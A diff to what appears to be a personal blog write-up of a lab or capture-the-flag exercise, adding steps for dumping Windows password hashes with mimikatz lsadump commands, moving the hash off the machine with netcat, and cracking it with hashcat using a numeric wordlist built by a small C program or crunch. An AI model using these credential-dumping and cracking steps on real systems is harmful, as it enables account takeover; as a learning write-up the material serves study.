@@ -52,8 +52,35 @@ Now I need the dump hash with mimikatz:
 lsadump::lsa /inject
 lsadump::lsa /patch
 ```
-you can use one of the above code.  
+you can use one of the above code.(first one is suit for me)  
 
 ![mimikatz](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/47d28277-7210-48f7-94d2-d353d6a79457)
 
+Now you see the hash.  
+Notice that the Windows default user ID starts at 1000, and 500 for Administrator.  
+After then I send the hash my pc using netcat.  
 
+![netcat](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/697925ae-f5fe-46fc-ad06-1cd06ae78cf9)
+
+And try to crack hash with hashcat but first i need to create a password list.  
+To do that I write this simple code:  
+```
+#include<stdio.h>
+
+int main(){
+    for (int i=0;i<124;i++){
+	    printf("%d\n",i);
+    }
+}
+```
+If you want to do that with crunch.  
+```
+crunch 3 3 0123456789 > password.txt
+```
+Now crack time...  
+
+![2023-10-20_00-07](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/ff674098-d969-4b98-925c-5e9edc054ab2)  
+
+![2023-10-20_00-08](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/12029ff1-6a76-45ae-ad9a-f3f89618a5ad)
+
+You can see the password next to the hash in the picture above.
